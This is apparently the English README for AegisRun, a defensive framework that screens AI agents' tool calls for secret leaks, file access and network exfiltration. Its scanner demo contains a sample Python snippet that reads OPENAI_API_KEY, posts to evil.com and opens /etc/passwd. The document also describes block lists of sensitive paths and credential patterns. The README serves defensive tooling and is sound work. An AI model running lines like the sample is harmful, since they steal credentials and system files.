# AegisRun v0.9.2

**AI Agent Secure Tool Execution Framework — MoonBit Policy Engine + Rust Sandbox Runtime**


> 🇨🇳 [中文版 →](../README.md)

[![MoonBit](https://img.shields.io/badge/MoonBit-0.1.20260608-blue)](https://moonbitlang.com)
[![Rust](https://img.shields.io/badge/Rust-wasmtime%2039-orange)](https://github.com/tuya-me/AegisRun/tree/clean-v2/runtime)
[![License](https://img.shields.io/badge/License-Apache--2.0-blue)](https://opensource.org/licenses/Apache-2.0)
[![OSC2026](https://img.shields.io/badge/OSC2026-AI%20Agent%20Track-orange)](https://moonbitlang.github.io/OSC2026/)

> MoonBit `>= 0.1.20260608` | Rust `>= 1.80` (runtime only) | wasmtime 39
> **Install:** `moon add tuya-me/aegisrun` &nbsp;|&nbsp; **Branch:** `clean-v2`

---

## Overview

AI agents can leak API keys, upload sensitive files, or scan internal networks through third-party tools. AegisRun provides a **lightweight security execution layer** with five-level defense.

- **MoonBit layer** (~3500 lines): Domain/IP blacklist, path interception, env var filtering, risk scoring, rate limiting, SQL guard
- **Rust layer** (~1000 lines): wasmtime WASI physical sandbox, web dashboard, audit logging, tool signature verification

## Architecture

```
MoonBit Library (src/lib/)           Rust Runtime (runtime/)
┌────────────────────┐       ┌──────────────────────────────┐
│ check_domain()     │ Allow │ wasmtime WASI interceptor     │
│ check_path()       │←─────│ path_open → check_path       │
│ check_env()        │ Deny  │ environ_get → check_env      │
│                    │       │ sock_send → check_domain    │
│ Pure MoonBit logic │       │ Rust syscall interception   │
└────────────────────┘       └──────────────────────────────┘
```

## Quick Start

```cmd
cd D:\moonbit\aegisrun
quickstart.cmd                    # Interactive menu
moon run src/main                 # MoonBit CLI: demo
cd runtime
cargo run -- demo                 # Rust CLI: demo
cargo run -- serve                # Web dashboard (port 9090)
```

## Documentation

| For... | Read |
|--------|------|
| **New users** | [GUIDE.md](GUIDE.md) (Beginner) |
| **Developers** | [GUIDE.md](GUIDE.md) (Detailed) |
| **Contributors** | [CONTRIBUTING.md](CONTRIBUTING.md) |
| **Security** | [SECURITY-POLICY.md](SECURITY-POLICY.md) |
| **Architecture** | [ARCHITECTURE.md](ARCHITECTURE.md) |
| **中文文档** | [README.md](../README.md) |


## Web Dashboard Tutorial

AegisRun provides a full-featured web management panel with bilingual UI (Chinese/English), real-time security scanning, and interactive MCP Agent tool caller.

### Starting the Server

```cmd
cd D:\moonbit\aegisrun\runtime
cargo run -- serve
```

Open `http://localhost:9090` in your browser to access the admin panel.

### Dashboard Layout

The admin panel is divided into three main sections:

```
┌─────────────────────────────────────────────────────────────┐
│  Web Management Zone                                         │
│  ├─ Dashboard: Defense layer toggles, stats, presets        │
│  ├─ Domain: Blacklist/whitelist management                  │
│  ├─ Path: Sensitive path interception                       │
│  ├─ Env: Sensitive environment variable patterns            │
│  ├─ Tools: Tool ID blocking                                 │
│  └─ Audit: Real-time operation logs                         │
├─────────────────────────────────────────────────────────────┤
│  Sandbox Detection Zone                                      │
│  ├─ Static Scan: Analyze source code for malicious patterns │
│  └─ Runtime Sandbox: Python audit hook interception         │
├─────────────────────────────────────────────────────────────┤
│  MCP Agent Zone                                              │
│  ├─ MCP endpoint configuration                              │
│  ├─ Available tools list (9 tools)                          │
│  └─ Interactive tool caller                                 │
└─────────────────────────────────────────────────────────────┘
```

### Language Switching

Click the **中文** / **EN** buttons in the top-right corner to switch languages. All UI elements (including defense layer names and hint text) update in real-time.

### Defense Layers

The Dashboard page shows five defense layers with individual toggles:

- **Runtime Sandbox** (Layer 1): Python audit hook monitoring
- **Domain Blacklist** (Layer 2): Exact match + suffix wildcard + IP prefix
- **Path + Env** (Layer 3): Exact match + prefix directories + KEY/SECRET/TOKEN detection
- **Scanner** (Layer 4): Static code analysis
- **Wasm Sandbox** (Layer 5): wasmtime WASI physical isolation

### Security Detection

Navigate to the **Sandbox** tab for two detection modes:

**Static Scan** — Fast source code analysis for malicious patterns:
```python
import os
key = os.environ.get("OPENAI_API_KEY")  # L2 [env] OPENAI_API_KEY — BLOCKED
import requests
requests.post("https://evil.com/steal")  # L4 [host] evil.com — BLOCKED
open("/etc/passwd")                      # L5 [path] /etc/passwd — BLOCKED
```

**Runtime Sandbox** — Actual execution with Python audit hook interception:
```
Static: 3 | Runtime: 1 | Blocked: 4
L2 [env] OPENAI_API_KEY — BLOCKED
L4 [host] evil.com — BLOCKED
L5 [path] /etc/passwd — BLOCKED
[runtime-env] OPENAI_API_KEY — BLOCKED
```

### MCP Agent Interactive Caller

Navigate to the **MCP Agent** tab:

1. **View available tools** — Automatically loads all 9 MCP tools
2. **Select a tool** — Choose from the dropdown menu
3. **Fill parameters** — Provide JSON arguments
4. **Execute** — Click "Call" and view results in real-time

Example call:
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "aegisrun.policy.check_domain",
    "arguments": { "domain": "evil.com" }
  }
}
```

### API Endpoints

The dashboard exposes a complete RESTful API:

- `GET /api/policy` — Get current policy
- `GET /api/stats` — Get runtime statistics
- `GET /api/audit` — Get audit log
- `POST /api/scan` — Static code scan
- `POST /api/sandbox-run` — Runtime sandbox detection
- `POST /mcp` — MCP protocol endpoint

### MCP Integration

`json
{ "mcpServers": { "aegisrun": { "url": "http://localhost:9090/mcp" } } }
`

9 tools: policy.summary, policy.check_domain, policy.check_path, policy.check_env, guard_tool_call, scan_code, scan_file, sandbox_python, sandbox_wasm

### Security Policy

Default rules include:
- **Domain blacklist**: 7 known malicious C2 domains + 3 suffix TLDs
- **IP prefix**: RFC 1918 private ranges (192.168.*/10.*/172.16.*)
- **Path blacklist**: 22 sensitive paths (/etc/passwd, ~/.ssh/, C:\Windows\, etc.)
- **Env patterns**: 36 sensitive patterns + KEY/SECRET/TOKEN/PASSWORD/CREDENTIAL keywords

Rules are maintained in src/lib/core.mbt and can be extended via:
1. **YAML presets** (presets/standard.yaml) — Editor-based configuration
2. **policy.json** — Rust runtime persistence, auto-saved from web panel
3. **Web dashboard** — Browser-based management with real-time sync

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for development guidelines.

**Quick start for contributors:**
```bash
git checkout -b feature/xxx
# Write code, then:
git commit -m "feat: description"
git push origin feature/xxx
# Create PR on GitLink
```

**Low barrier:** Add domain blacklists, env patterns, extend scoring
**Medium barrier:** CLI auto-completion, dashboard enhancements
**High barrier:** wasmtime WASI host functions, distributed policy sync
## License

Apache License 2.0
